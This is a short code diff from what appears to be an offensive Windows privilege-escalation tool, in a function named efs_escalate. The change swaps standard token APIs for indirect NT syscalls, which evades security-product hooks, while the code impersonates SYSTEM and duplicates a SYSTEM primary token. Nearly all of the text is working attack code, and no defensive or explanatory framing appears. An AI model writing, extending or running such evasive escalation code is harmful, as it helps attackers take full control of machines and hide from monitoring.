@@ -116,16 +116,22 @@ VOID efs_escalate(char* ip,char* port) {
     }
     printf("[+] Impersonating SYSTEM\n");
 
+    g_ssn = getSSN("NtOpenThreadToken");
+    g_syscall = getSyscallAddr("NtOpenThreadToken");
     HANDLE h_ex = NULL;
-    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &h_ex)) {
-        printf("[-] OpenThreadToken: %lu\n", GetLastError());
+    NTSTATUS status = iNtOpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &h_ex);
+    if (!NT_SUCCESS(status)) {
+        printf("[-] NtOpenThreadToken: 0x%lX\n", status);
         RevertToSelf(); CloseHandle(hpipe); return;
     }
 
+    g_ssn = getSSN("NtDuplicateToken");
+    g_syscall = getSyscallAddr("NtDuplicateToken");
+    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
     HANDLE h_new = NULL;
-    if (!DuplicateTokenEx(h_ex, MAXIMUM_ALLOWED, NULL,
-        SecurityImpersonation, TokenPrimary, &h_new)) {
-        printf("[-] DuplicateTokenEx: %lu\n", GetLastError());
+    status = iNtDuplicateToken(h_ex, MAXIMUM_ALLOWED, &oa, FALSE, TokenPrimary, &h_new);
+    if (!NT_SUCCESS(status)) {
+        printf("[-] NtDuplicateToken: 0x%lX\n", status);
         CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe); return;
     }
     printf("[+] SYSTEM token duplicated\n");
